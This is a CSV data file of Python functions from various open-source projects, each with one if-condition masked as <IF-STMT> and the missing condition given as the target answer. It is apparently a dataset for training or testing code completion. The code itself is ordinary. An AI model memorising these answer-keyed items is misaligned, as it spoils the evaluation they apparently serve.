,cleaned_method,target_block,tokens_in_method
0,"def __init__(self, scale, factor, mode):<tab>self.index = 0<tab>self.scale = scale<tab>if factor is None:<tab><tab>self._log_factor = None<tab>else:<tab><tab><IF-STMT><tab><tab><tab>raise ValueError(""'factor' must be >= 1.0"")<tab><tab>self._log_factor = np.log(factor)<tab>if mode not in self.allowed_modes:<tab><tab>raise ValueError(<tab><tab><tab>(""'{0}' is not a recognized mode. "" ""Please select from: {1}"").format(<tab><tab><tab><tab>mode, self.allowed_modes<tab><tab><tab>)<tab><tab>)<tab>self.mode = mode",if factor < 1.0 :,160
1,"def get_grab_keys(self):<tab>keystr = None<tab>try:<tab><tab>keys = self.display.get_grab_keys()<tab><tab>for k in keys:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>keystr = gtk.gdk.keyval_name(k)<tab><tab><tab>else:<tab><tab><tab><tab>keystr = keystr + ""+"" + gtk.gdk.keyval_name(k)<tab>except:<tab><tab>pass<tab>return keystr",if keystr is None :,115
2,"def _checkAllExamples(self, num_type):<tab>for region_code in phonenumberutil.SUPPORTED_REGIONS:<tab><tab>numobj_py = phonenumberutil.example_number_for_type(region_code, num_type)<tab><tab><IF-STMT><tab><tab><tab>numobj_pb = PyToPB(numobj_py)<tab><tab><tab>alt_py = PBToPy(numobj_pb)<tab><tab><tab>self.assertEqual(numobj_py, alt_py)",if numobj_py is not None :,127
3,"def _gaf10iterator(handle):<tab>for inline in handle:<tab><tab>if inline[0] == ""!"":<tab><tab><tab>continue<tab><tab>inrec = inline.rstrip(""\n"").split(""\t"")<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>inrec[3] = inrec[3].split(""|"")  # Qualifier<tab><tab>inrec[5] = inrec[5].split(""|"")  # DB:reference(s)<tab><tab>inrec[7] = inrec[7].split(""|"")  # With || From<tab><tab>inrec[10] = inrec[10].split(""|"")  # Synonym<tab><tab>inrec[12] = inrec[12].split(""|"")  # Taxon<tab><tab>yield dict(zip(GAF10FIELDS, inrec))",if len ( inrec ) == 1 :,188
4,"def __xor__(self, other):<tab>inc, exc = _norm_args_notimplemented(other)<tab>if inc is NotImplemented:<tab><tab>return NotImplemented<tab>if inc is NotImplemented:<tab><tab>return NotImplemented<tab>if self._included is None:<tab><tab><IF-STMT>  # - +<tab><tab><tab>return _ComplementSet(excluded=self._excluded - inc)<tab><tab>else:  # - -<tab><tab><tab>return _ComplementSet(included=self._excluded.symmetric_difference(exc))<tab>else:<tab><tab>if inc is None:  # + -<tab><tab><tab>return _ComplementSet(excluded=exc - self._included)<tab><tab>else:  # + +<tab><tab><tab>return _ComplementSet(included=self._included.symmetric_difference(inc))",if exc is None :,183
5,"def connection(self, commit_on_success=False):<tab>with self._lock:<tab><tab>if self._bulk_commit:<tab><tab><tab>if self._pending_connection is None:<tab><tab><tab><tab>self._pending_connection = sqlite.connect(self.filename)<tab><tab><tab>con = self._pending_connection<tab><tab>else:<tab><tab><tab>con = sqlite.connect(self.filename)<tab><tab>try:<tab><tab><tab>if self.fast_save:<tab><tab><tab><tab>con.execute(""PRAGMA synchronous = 0;"")<tab><tab><tab>yield con<tab><tab><tab>if commit_on_success and self.can_commit:<tab><tab><tab><tab>con.commit()<tab><tab>finally:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>con.close()",if not self . _bulk_commit :,182
6,"def renderable_events(self, date, hour):<tab>""Returns the number of renderable events""<tab>renderable_events = []<tab>for event in self.events:<tab><tab>if event.covers(date, hour):<tab><tab><tab>renderable_events.append(event)<tab>if hour:<tab><tab>for current in renderable_events:<tab><tab><tab>for event in self.events:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>for hour in range(self.start_hour, self.end_hour):<tab><tab><tab><tab><tab><tab>if current.covers(date, hour) and event.covers(date, hour):<tab><tab><tab><tab><tab><tab><tab>renderable_events.append(event)<tab><tab><tab><tab><tab><tab><tab>break<tab>return renderable_events",if event not in renderable_events :,191
7,"def _prepare_cooldowns(self, ctx):<tab>if self._buckets.valid:<tab><tab>dt = ctx.message.edited_at or ctx.message.created_at<tab><tab>current = dt.replace(tzinfo=datetime.timezone.utc).timestamp()<tab><tab>bucket = self._buckets.get_bucket(ctx.message, current)<tab><tab>retry_after = bucket.update_rate_limit(current)<tab><tab><IF-STMT><tab><tab><tab>raise CommandOnCooldown(bucket, retry_after)",if retry_after :,122
8,"def TryMerge(self, d):<tab>while d.avail() > 0:<tab><tab>tt = d.getVarInt32()<tab><tab>if tt == 10:<tab><tab><tab>self.set_module(d.getPrefixedString())<tab><tab><tab>continue<tab><tab><IF-STMT><tab><tab><tab>self.set_version(d.getPrefixedString())<tab><tab><tab>continue<tab><tab>if tt == 24:<tab><tab><tab>self.set_instances(d.getVarInt64())<tab><tab><tab>continue<tab><tab>if tt == 0:<tab><tab><tab>raise ProtocolBuffer.ProtocolBufferDecodeError<tab><tab>d.skipData(tt)",if tt == 18 :,150
9,"def n_import_from(self, node):<tab>relative_path_index = 0<tab>if self.version >= 2.5:<tab><tab>if node[relative_path_index].pattr > 0:<tab><tab><tab>node[2].pattr = (""."" * node[relative_path_index].pattr) + node[2].pattr<tab><tab><IF-STMT><tab><tab><tab>if isinstance(node[1].pattr, tuple):<tab><tab><tab><tab>imports = node[1].pattr<tab><tab><tab><tab>for pattr in imports:<tab><tab><tab><tab><tab>node[1].pattr = pattr<tab><tab><tab><tab><tab>self.default(node)<tab><tab><tab><tab>return<tab><tab><tab>pass<tab>self.default(node)",if self . version > 2.7 :,170
10,def logic():<tab>while 1:<tab><tab>yield a<tab><tab>var = 0<tab><tab>for i in downrange(len(a)):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>var += 1<tab><tab>out.next = var,if a [ i ] == 1 :,61
11,"def _extract_networks(self, server_node):<tab>""""""Marshal the networks attribute of a parsed request""""""<tab>node = self.find_first_child_named(server_node, ""networks"")<tab>if node is not None:<tab><tab>networks = []<tab><tab>for network_node in self.find_children_named(node, ""network""):<tab><tab><tab>item = {}<tab><tab><tab><IF-STMT><tab><tab><tab><tab>item[""uuid""] = network_node.getAttribute(""uuid"")<tab><tab><tab>if network_node.hasAttribute(""fixed_ip""):<tab><tab><tab><tab>item[""fixed_ip""] = network_node.getAttribute(""fixed_ip"")<tab><tab><tab>networks.append(item)<tab><tab>return networks<tab>else:<tab><tab>return None","if network_node . hasAttribute ( ""uuid"" ) :",186
12,"def _model_shorthand(self, args):<tab>accum = []<tab>for arg in args:<tab><tab>if isinstance(arg, Node):<tab><tab><tab>accum.append(arg)<tab><tab><IF-STMT><tab><tab><tab>accum.append(arg)<tab><tab>elif isinstance(arg, ModelAlias):<tab><tab><tab>accum.extend(arg.get_proxy_fields())<tab><tab>elif isclass(arg) and issubclass(arg, Model):<tab><tab><tab>accum.extend(arg._meta.declared_fields)<tab>return accum","elif isinstance ( arg , Query ) :",125
13,"def on_show_comment(self, widget, another):<tab>if widget.get_active():<tab><tab><IF-STMT><tab><tab><tab>self.treeview.update_items(all=True, comment=True)<tab><tab>else:<tab><tab><tab>self.treeview.update_items(comment=True)<tab>else:<tab><tab>if another.get_active():<tab><tab><tab>self.treeview.update_items(all=True)<tab><tab>else:<tab><tab><tab>self.treeview.update_items()",if another . get_active ( ) :,121
14,"def test_select_figure_formats_set():<tab>ip = get_ipython()<tab>for fmts in [<tab><tab>{""png"", ""svg""},<tab><tab>[""png""],<tab><tab>(""jpeg"", ""pdf"", ""retina""),<tab><tab>{""svg""},<tab>]:<tab><tab>active_mimes = {_fmt_mime_map[fmt] for fmt in fmts}<tab><tab>pt.select_figure_formats(ip, fmts)<tab><tab>for mime, f in ip.display_formatter.formatters.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>nt.assert_in(Figure, f)<tab><tab><tab>else:<tab><tab><tab><tab>nt.assert_not_in(Figure, f)",if mime in active_mimes :,170
15,"def update_from_data(self, data):<tab>super(HelpParameter, self).update_from_data(data)<tab># original help.py value_sources are strings, update command strings to value-source dict<tab>if self.value_sources:<tab><tab>self.value_sources = [<tab><tab><tab>str_or_dict<tab><tab><tab><IF-STMT><tab><tab><tab>else {""link"": {""command"": str_or_dict}}<tab><tab><tab>for str_or_dict in self.value_sources<tab><tab>]","if isinstance ( str_or_dict , dict )",130
16,def _reset_library_root_logger() -> None:<tab>global _default_handler<tab>with _lock:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>library_root_logger = _get_library_root_logger()<tab><tab>library_root_logger.removeHandler(_default_handler)<tab><tab>library_root_logger.setLevel(logging.NOTSET)<tab><tab>_default_handler = None,if not _default_handler :,99
17,"def extract_headers(headers):<tab>""""""This function extracts valid headers from interactive input.""""""<tab>sorted_headers = {}<tab>matches = re.findall(r""(.*):\s(.*)"", headers)<tab>for match in matches:<tab><tab>header = match[0]<tab><tab>value = match[1]<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>value = value[:-1]<tab><tab><tab>sorted_headers[header] = value<tab><tab>except IndexError:<tab><tab><tab>pass<tab>return sorted_headers","if value [ - 1 ] == "","" :",125
18,"def _call_user_data_handler(self, operation, src, dst):<tab>if hasattr(self, ""_user_data""):<tab><tab>for key, (data, handler) in self._user_data.items():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>handler.handle(operation, key, data, src, dst)",if handler is not None :,80
19,"def update(self, other=None, **kwargs):<tab>if other is not None:<tab><tab><IF-STMT><tab><tab><tab>other = other.items()<tab><tab>for key, value in other:<tab><tab><tab>if key in kwargs:<tab><tab><tab><tab>raise TensorforceError.value(<tab><tab><tab><tab><tab>name=""NestedDict.update"",<tab><tab><tab><tab><tab>argument=""key"",<tab><tab><tab><tab><tab>value=key,<tab><tab><tab><tab><tab>condition=""specified twice"",<tab><tab><tab><tab>)<tab><tab><tab>self[key] = value<tab>for key, value in kwargs.items():<tab><tab>self[key] = value","if hasattr ( other , ""items"" ) :",153
20,"def _restore_context(context):<tab># Check for changes in contextvars, and set them to the current<tab># context for downstream consumers<tab>for cvar in context:<tab><tab>try:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>cvar.set(context.get(cvar))<tab><tab>except LookupError:<tab><tab><tab>cvar.set(context.get(cvar))",if cvar . get ( ) != context . get ( cvar ) :,103
21,"def __str__(self):<tab>s = ""{""<tab>sep = """"<tab>for k, v in self.iteritems():<tab><tab>s += sep<tab><tab><IF-STMT><tab><tab><tab>s += ""'%s'"" % k<tab><tab>else:<tab><tab><tab>s += str(k)<tab><tab>s += "": ""<tab><tab>if type(v) == str:<tab><tab><tab>s += ""'%s'"" % v<tab><tab>else:<tab><tab><tab>s += str(v)<tab><tab>sep = "", ""<tab>s += ""}""<tab>return s",if type ( k ) == str :,131
22,"def read_file_or_url(self, fname):<tab># TODO: not working on localhost<tab>if isinstance(fname, file):<tab><tab>result = open(fname, ""r"")<tab>else:<tab><tab>match = self.urlre.match(fname)<tab><tab><IF-STMT><tab><tab><tab>result = urllib.urlopen(match.group(1))<tab><tab>else:<tab><tab><tab>fname = os.path.expanduser(fname)<tab><tab><tab>try:<tab><tab><tab><tab>result = open(os.path.expanduser(fname), ""r"")<tab><tab><tab>except IOError:<tab><tab><tab><tab>result = open(<tab><tab><tab><tab><tab>""%s.%s"" % (os.path.expanduser(fname), self.defaultExtension), ""r""<tab><tab><tab><tab>)<tab>return result",if match :,184
23,"def subclass_managers(self, recursive):<tab>for cls in self.class_.__subclasses__():<tab><tab>mgr = manager_of_class(cls)<tab><tab><IF-STMT><tab><tab><tab>yield mgr<tab><tab><tab>if recursive:<tab><tab><tab><tab>for m in mgr.subclass_managers(True):<tab><tab><tab><tab><tab>yield m",if mgr is not None and mgr is not self :,89
24,"def star_path(path):<tab>""""""Replace integers and integer-strings in a path with *""""""<tab>path = list(path)<tab>for i, p in enumerate(path):<tab><tab>if isinstance(p, int):<tab><tab><tab>path[i] = ""*""<tab><tab>else:<tab><tab><tab>if not isinstance(p, text_type):<tab><tab><tab><tab>p = p.decode()<tab><tab><tab><IF-STMT><tab><tab><tab><tab>path[i] = ""*""<tab>return join_path(path)",if r_is_int . match ( p ) :,127
25,"def cookie_decode(data, key):<tab>""""""Verify and decode an encoded string. Return an object or None""""""<tab>if isinstance(data, unicode):<tab><tab>data = data.encode(""ascii"")  # 2to3 hack<tab>if cookie_is_encoded(data):<tab><tab>sig, msg = data.split(u""?"".encode(""ascii""), 1)  # 2to3 hack<tab><tab><IF-STMT><tab><tab><tab>return pickle.loads(base64.b64decode(msg))<tab>return None","if sig [ 1 : ] == base64 . b64encode ( hmac . new ( key , msg ) . digest ( ) ) :",137
26,"def parse_row(cls, doc_row):<tab>row = {}<tab>for field_name, field in FIELD_MAP.items():<tab><tab>if len(doc_row) > field[1]:<tab><tab><tab>field_value = doc_row[field[1]]<tab><tab>else:<tab><tab><tab>field_value = """"<tab><tab><IF-STMT><tab><tab><tab>field_value = field[2](field_value)<tab><tab>row[field_name] = field_value<tab>return row",if len ( field ) >= 3 and callable ( field [ 2 ] ) :,127
27,"def semantic_masks(self):<tab>for sid in self._seg_ids:<tab><tab>sinfo = self._sinfo.get(sid)<tab><tab><IF-STMT><tab><tab><tab># Some pixels (e.g. id 0 in PanopticFPN) have no instance or semantic predictions.<tab><tab><tab>continue<tab><tab>yield (self._seg == sid).numpy().astype(np.bool), sinfo","if sinfo is None or sinfo [ ""isthing"" ] :",104
28,"def top_level_subjects(self):<tab>if self.subjects.exists():<tab><tab>return optimize_subject_query(self.subjects.filter(parent__isnull=True))<tab>else:<tab><tab># TODO: Delet this when all PreprintProviders have a mapping<tab><tab><IF-STMT><tab><tab><tab>return optimize_subject_query(<tab><tab><tab><tab>Subject.objects.filter(parent__isnull=True, provider___id=""osf"")<tab><tab><tab>)<tab><tab>tops = set([sub[0][0] for sub in self.subjects_acceptable])<tab><tab>return [Subject.load(sub) for sub in tops]",if len ( self . subjects_acceptable ) == 0 :,157
29,"def resolve(obj):<tab>if isinstance(obj, list):<tab><tab>for item in obj:<tab><tab><tab>resolve(item)<tab><tab>return<tab>if isinstance(obj, dict):<tab><tab><IF-STMT><tab><tab><tab>with resolver.resolving(obj[u""$ref""]) as resolved:<tab><tab><tab><tab>resolve(resolved)<tab><tab><tab><tab>obj.clear()<tab><tab><tab><tab>obj.update(resolved)<tab><tab>else:<tab><tab><tab>for value in obj.values():<tab><tab><tab><tab>resolve(value)","if ""$ref"" in obj :",127
30,"def read_ansible_config(project_path, variables_of_interest):<tab>fnames = [""/etc/ansible/ansible.cfg""]<tab>if project_path:<tab><tab>fnames.append(os.path.join(project_path, ""ansible.cfg""))<tab>values = {}<tab>try:<tab><tab>parser = ConfigParser()<tab><tab>parser.read(fnames)<tab><tab>if ""defaults"" in parser:<tab><tab><tab>for var in variables_of_interest:<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>values[var] = parser[""defaults""][var]<tab>except Exception:<tab><tab>logger.exception(""Failed to read ansible configuration(s) {}"".format(fnames))<tab>return values","if var in parser [ ""defaults"" ] :",166
31,"def test_globalphase():<tab>rule_set = DecompositionRuleSet(modules=[globalphase, r2rzandph])<tab>dummy = DummyEngine(save_commands=True)<tab>eng = MainEngine(<tab><tab>dummy,<tab><tab>[AutoReplacer(rule_set), InstructionFilter(low_level_gates_noglobalphase)],<tab>)<tab>qubit = eng.allocate_qubit()<tab>R(1.2) | qubit<tab>rz_count = 0<tab>for cmd in dummy.received_commands:<tab><tab>assert not isinstance(cmd.gate, R)<tab><tab><IF-STMT><tab><tab><tab>rz_count += 1<tab><tab><tab>assert cmd.gate == Rz(1.2)<tab>assert rz_count == 1","if isinstance ( cmd . gate , Rz ) :",188
32,def _kill_current_player(self):<tab>if self._current_player:<tab><tab><IF-STMT><tab><tab><tab>self.voice_client.resume()<tab><tab>try:<tab><tab><tab>self.voice_client.stop()<tab><tab>except OSError:<tab><tab><tab>pass<tab><tab>self._current_player = None<tab><tab>return True<tab>return False,if self . voice_client . is_paused ( ) :,93
33,"def hasAmbiguousLanguage(self, p):<tab>""""""Return True if p.b contains different @language directives.""""""<tab># c = self<tab>languages, tag = set(), ""@language""<tab>for s in g.splitLines(p.b):<tab><tab><IF-STMT><tab><tab><tab>i = g.skip_ws(s, len(tag))<tab><tab><tab>j = g.skip_id(s, i)<tab><tab><tab>word = s[i:j]<tab><tab><tab>languages.add(word)<tab>return len(list(languages)) > 1","if g . match_word ( s , 0 , tag ) :",140
34,"def terminate(self):<tab>n_retries = 10<tab>for i in range(n_retries):<tab><tab>try:<tab><tab><tab>super(MemmappingPool, self).terminate()<tab><tab><tab>break<tab><tab>except OSError as e:<tab><tab><tab>if isinstance(e, WindowsError):<tab><tab><tab><tab># Workaround  occasional ""[Error 5] Access is denied"" issue<tab><tab><tab><tab># when trying to terminate a process under windows.<tab><tab><tab><tab>sleep(0.1)<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>warnings.warn(<tab><tab><tab><tab><tab><tab>""Failed to terminate worker processes in""<tab><tab><tab><tab><tab><tab>"" multiprocessing pool: %r"" % e<tab><tab><tab><tab><tab>)<tab>self._temp_folder_manager._unlink_temporary_resources()",if i + 1 == n_retries :,192
35,"def test_downsampling(self, method, maybe_range, fraction, expected_n_reads):<tab>reader = sam.SamReader(<tab><tab>test_utils.genomics_core_testdata(""test.bam""),<tab><tab>downsample_fraction=fraction,<tab><tab>random_seed=12345,<tab>)<tab>with reader:<tab><tab><IF-STMT><tab><tab><tab>reads_iter = reader.iterate()<tab><tab>elif method == ""query"":<tab><tab><tab>reads_iter = reader.query(ranges.parse_literal(maybe_range))<tab><tab>else:<tab><tab><tab>self.fail(""Unexpected method "" + str(method))<tab><tab>self.assertEqual(test_utils.iterable_len(reads_iter), expected_n_reads)","if method == ""iterate"" :",177
36,"def verify_acceptable(self):<tab>start = time.time()<tab>while True:<tab><tab><IF-STMT><tab><tab><tab>return<tab><tab>elif (time.time() - start) > READ_TIMEOUT:<tab><tab><tab>raise Exception(""Server socket did not accept in time"")<tab><tab>time.sleep(0.1)",if self . select_acceptable ( ) :,79
37,"def replica_local_creator(next_creator, **kwargs) -> tf.Variable:<tab>""""""Variable creator that by default creates replica local variables.""""""<tab>if kwargs[""synchronization""] == tf.VariableSynchronization.AUTO:<tab><tab>kwargs[""synchronization""] = tf.VariableSynchronization.ON_READ<tab><tab><IF-STMT><tab><tab><tab>kwargs[""aggregation""] = tf.VariableAggregation.ONLY_FIRST_REPLICA<tab><tab>if kwargs[""trainable""] is None:<tab><tab><tab>kwargs[""trainable""] = True<tab>return next_creator(**kwargs)","if kwargs [ ""aggregation"" ] == tf . VariableAggregation . NONE :",144
38,"def get_optional_nargs(self, name):<tab>for n, kwargs in self.conf[""optional_args""]:<tab><tab>if name == n:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>action = kwargs[""action""]<tab><tab><tab><tab>if action in (""store_true"", ""store_false""):<tab><tab><tab><tab><tab>return 0<tab><tab><tab>break<tab>return 1","if ""action"" in kwargs :",92
39,"def ageToDays(self, age_str):<tab>age = 0<tab>age_str = age_str.replace(""&nbsp;"", "" "")<tab>regex = ""(\d*.?\d+).(sec|hour|day|week|month|year)+""<tab>matches = re.findall(regex, age_str)<tab>for match in matches:<tab><tab>nr, size = match<tab><tab>mult = 1<tab><tab>if size == ""week"":<tab><tab><tab>mult = 7<tab><tab>elif size == ""month"":<tab><tab><tab>mult = 30.5<tab><tab><IF-STMT><tab><tab><tab>mult = 365<tab><tab>age += tryInt(nr) * mult<tab>return tryInt(age)","elif size == ""year"" :",163
40,"def put(self, userId, bucket, key, data):<tab>if not self.initialized:<tab><tab>raise Exception(""archive not initialized"")<tab>try:<tab><tab>uri = self.uri_for(userId, bucket, key)<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Failed writing file content to disk: {}"".format(uri))<tab><tab>else:<tab><tab><tab>return uri<tab>except Exception as err:<tab><tab>logger.debug(""cannot put data: exception - "" + str(err))<tab><tab>raise err","if not self . _save_content ( uri , data ) :",131
41,"def get_range(min, max):<tab>if max < min:<tab><tab>min, max = max, min<tab>elif min == max:<tab><tab>if min < 0:<tab><tab><tab>min, max = 2 * min, 0<tab><tab><IF-STMT><tab><tab><tab>min, max = 0, 2 * min<tab><tab>else:<tab><tab><tab>min, max = -1, 1<tab>return min, max",elif min > 0 :,99
42,"def update_job_weights():<tab>""""""Update job weights.""""""<tab>for job in data_types.Job.query():<tab><tab>multiplier = DEFAULT_MULTIPLIER<tab><tab>if environment.is_engine_fuzzer_job(job.name):<tab><tab><tab>targets_count = ndb.Key(data_types.FuzzTargetsCount, job.name).get()<tab><tab><tab># If the count is 0, it may be due to a bad build or some other issue. Use<tab><tab><tab># the default weight in that case to allow for recovery.<tab><tab><tab>if targets_count and targets_count.count:<tab><tab><tab><tab>multiplier = targets_count.count<tab><tab><tab><tab><IF-STMT><tab><tab><tab><tab><tab>multiplier = TARGET_COUNT_WEIGHT_CAP<tab><tab>update_job_weight(job.name, multiplier)",if multiplier > TARGET_COUNT_WEIGHT_CAP :,199
43,"def _validate_required_settings(<tab>self, application_id, application_config, required_settings, should_throw=True):<tab>""""""All required keys must be present""""""<tab>for setting_key in required_settings:<tab><tab>if setting_key not in application_config.keys():<tab><tab><tab><IF-STMT><tab><tab><tab><tab>raise ImproperlyConfigured(<tab><tab><tab><tab><tab>MISSING_SETTING.format(<tab><tab><tab><tab><tab><tab>application_id=application_id, setting=setting_key<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>)<tab><tab><tab>else:<tab><tab><tab><tab>return False<tab>return True",if should_throw :,146
44,"def nested_update(org_dict, upd_dict):<tab>for key, value in upd_dict.items():<tab><tab>if isinstance(value, dict):<tab><tab><tab><IF-STMT><tab><tab><tab><tab>if not isinstance(org_dict[key], dict):<tab><tab><tab><tab><tab>raise ValueError(<tab><tab><tab><tab><tab><tab>""Mismatch between org_dict and upd_dict at node {}"".format(key)<tab><tab><tab><tab><tab>)<tab><tab><tab><tab>nested_update(org_dict[key], value)<tab><tab><tab>else:<tab><tab><tab><tab>org_dict[key] = value<tab><tab>else:<tab><tab><tab>org_dict[key] = value",if key in org_dict :,161
45,"def eintr_retry_call(func, *args, **kwargs):<tab>while True:<tab><tab>try:<tab><tab><tab>return func(*args, **kwargs)<tab><tab>except EnvironmentError as e:<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>raise","if getattr ( e , ""errno"" , None ) == errno . EINTR :",79
46,"def __init__(self, entity):<tab>self._entity = weakref.proxy(entity)<tab>self._observables = collections.OrderedDict()<tab>self._keys_helper = _ObservableKeys(self._entity, self._observables)<tab># Ensure consistent ordering.<tab>for attr_name in sorted(dir(type(self))):<tab><tab>type_attr = getattr(type(self), attr_name)<tab><tab><IF-STMT><tab><tab><tab>self._observables[attr_name] = getattr(self, attr_name)","if isinstance ( type_attr , define . observable ) :",131
47,"def check_redundancy(self):<tab># Ensure there are no adjacent blocks (they should have been merged)<tab>starts, sizes = self.allocator.get_allocated_regions()<tab>last = -1<tab>for start, size in zip(starts, sizes):<tab><tab>if start < last:<tab><tab><tab>raise Exception(""Block at %d is out of order"" % start)<tab><tab><IF-STMT><tab><tab><tab>raise Exception(""Block at %d is redundant"" % start)<tab><tab>last = start + size",if start == last :,122
48,"def elfheader():<tab>local_path = pwndbg.file.get_file(pwndbg.proc.exe)<tab>with open(local_path, ""rb"") as f:<tab><tab>elffile = ELFFile(f)<tab><tab>sections = []<tab><tab>for section in elffile.iter_sections():<tab><tab><tab>start = section[""sh_addr""]<tab><tab><tab># Don't print sections that aren't mapped into memory<tab><tab><tab><IF-STMT><tab><tab><tab><tab>continue<tab><tab><tab>size = section[""sh_size""]<tab><tab><tab>sections.append((start, start + size, section.name))<tab><tab>sections.sort()<tab><tab>for start, end, name in sections:<tab><tab><tab>print(""%#x - %#x "" % (start, end), name)",if start == 0 :,189
49,"def orbit():<tab>""""""Define the internal thread for running the orbit.""""""<tab>for point in points:<tab><tab>self.set_position(point)<tab><tab>self.set_focus(focus)<tab><tab>self.set_viewup(viewup)<tab><tab>self.renderer.ResetCameraClippingRange()<tab><tab>self.render()<tab><tab>time.sleep(step)<tab><tab><IF-STMT><tab><tab><tab>self.write_frame()",if write_frames :,107
50,"def json_format(self):<tab>""""""Returns the integer value formatted as a JSON literal""""""<tab>fmt = self._jsonfmt<tab>if fmt == NUMBER_FORMAT_HEX:<tab><tab>return format(self, ""#x"")<tab>elif fmt == NUMBER_FORMAT_OCTAL:<tab><tab>return format(self, ""#o"")<tab>elif fmt == NUMBER_FORMAT_BINARY:<tab><tab>return format(self, ""#b"")<tab>elif fmt == NUMBER_FORMAT_LEGACYOCTAL:<tab><tab>if self == 0:<tab><tab><tab>return ""0""  # For some reason Python's int doesn't do '00'<tab><tab><IF-STMT><tab><tab><tab>return ""-0%o"" % (-self)<tab><tab>else:<tab><tab><tab>return ""0%o"" % self<tab>else:<tab><tab>return str(self)",elif self < 0 :,189
51,"def parseTime(timeStr):<tab>regex = re.compile(constants.PARSE_TIME_REGEX)<tab>parts = regex.match(timeStr)<tab>if not parts:<tab><tab>return<tab>parts = parts.groupdict()<tab>time_params = {}<tab>for (name, param) in parts.items():<tab><tab><IF-STMT><tab><tab><tab>if name == ""miliseconds"":<tab><tab><tab><tab>time_params[""microseconds""] = int(param) * 1000<tab><tab><tab>else:<tab><tab><tab><tab>time_params[name] = int(param)<tab>return datetime.timedelta(**time_params).total_seconds()",if param :,146
52,"def build_extension(self, ext):<tab>ext._convert_pyx_sources_to_lang()<tab>_compiler = self.compiler<tab>try:<tab><tab>if isinstance(ext, Library):<tab><tab><tab>self.compiler = self.shlib_compiler<tab><tab>_build_ext.build_extension(self, ext)<tab><tab><IF-STMT><tab><tab><tab>cmd = self.get_finalized_command(""build_py"").build_lib<tab><tab><tab>self.write_stub(cmd, ext)<tab>finally:<tab><tab>self.compiler = _compiler",if ext . _needs_stub :,134
53,"def __init__(self, type, data, name=None):<tab>Constant.__init__(self, type, data, name)<tab>self.tag.unique_value = None<tab>if isinstance(data, np.ndarray) and data.ndim > 0:<tab><tab>flat_data = data.ravel()<tab><tab><IF-STMT><tab><tab><tab>if (flat_data == flat_data[0]).all():<tab><tab><tab><tab>self.tag.unique_value = flat_data[0]",if flat_data . shape [ 0 ] :,118
54,"def _find_machine(deb_arch):<tab>for machine in _ARCH_TRANSLATIONS:<tab><tab>if _ARCH_TRANSLATIONS[machine].get(""deb"", """") == deb_arch:<tab><tab><tab>return machine<tab><tab><IF-STMT><tab><tab><tab>return machine<tab>raise errors.SnapcraftEnvironmentError(<tab><tab>""Cannot set machine from deb_arch {!r}"".format(deb_arch)<tab>)","elif _ARCH_TRANSLATIONS [ machine ] . get ( ""uts_machine"" , """" ) == deb_arch :",124
55,"def fields_for_form(form, only_fields, exclude_fields):<tab>fields = OrderedDict()<tab>for name, field in form.fields.items():<tab><tab>is_not_in_only = only_fields and name not in only_fields<tab><tab>is_excluded = (<tab><tab><tab>name<tab><tab><tab>in exclude_fields  # or<tab><tab><tab># name in already_created_fields<tab><tab>)<tab><tab><IF-STMT><tab><tab><tab>continue<tab><tab>fields[name] = convert_form_field(field)<tab>return fields",if is_not_in_only or is_excluded :,139
56,"def wait_services_ready(selectors, min_counts, count_fun, timeout=None):<tab>readies = [0] * len(selectors)<tab>start_time = time.time()<tab>while True:<tab><tab>all_satisfy = True<tab><tab>for idx, selector in enumerate(selectors):<tab><tab><tab>if readies[idx] < min_counts[idx]:<tab><tab><tab><tab>all_satisfy = False<tab><tab><tab><tab>readies[idx] = count_fun(selector)<tab><tab><tab><tab>break<tab><tab><IF-STMT><tab><tab><tab>break<tab><tab>if timeout and timeout + start_time < time.time():<tab><tab><tab>raise TimeoutError(""Wait cluster start timeout"")<tab><tab>time.sleep(1)",if all_satisfy :,167
57,def count_brokers(self):<tab>self.nb_brokers = 0<tab>for broker in self.brokers:<tab><tab><IF-STMT><tab><tab><tab>self.nb_brokers += 1<tab>for realm in self.higher_realms:<tab><tab>for broker in realm.brokers:<tab><tab><tab>if not broker.spare and broker.manage_sub_realms:<tab><tab><tab><tab>self.nb_brokers += 1,if not broker . spare :,118
58,"def _adapt_polymorphic_element(self, element):<tab>if ""parententity"" in element._annotations:<tab><tab>search = element._annotations[""parententity""]<tab><tab>alias = self._polymorphic_adapters.get(search, None)<tab><tab><IF-STMT><tab><tab><tab>return alias.adapt_clause(element)<tab>if isinstance(element, expression.FromClause):<tab><tab>search = element<tab>elif hasattr(element, ""table""):<tab><tab>search = element.table<tab>else:<tab><tab>return None<tab>alias = self._polymorphic_adapters.get(search, None)<tab>if alias:<tab><tab>return alias.adapt_clause(element)",if alias :,157
59,"def get_all_methods():<tab>estimators = all_estimators()<tab>for name, Estimator in estimators:<tab><tab>if name.startswith(""_""):<tab><tab><tab># skip private classes<tab><tab><tab>continue<tab><tab>methods = []<tab><tab>for name in dir(Estimator):<tab><tab><tab>if name.startswith(""_""):<tab><tab><tab><tab>continue<tab><tab><tab>method_obj = getattr(Estimator, name)<tab><tab><tab><IF-STMT><tab><tab><tab><tab>methods.append(name)<tab><tab>methods.append(None)<tab><tab>for method in sorted(methods, key=lambda x: str(x)):<tab><tab><tab>yield Estimator, method","if hasattr ( method_obj , ""__call__"" ) or isinstance ( method_obj , property ) :",161
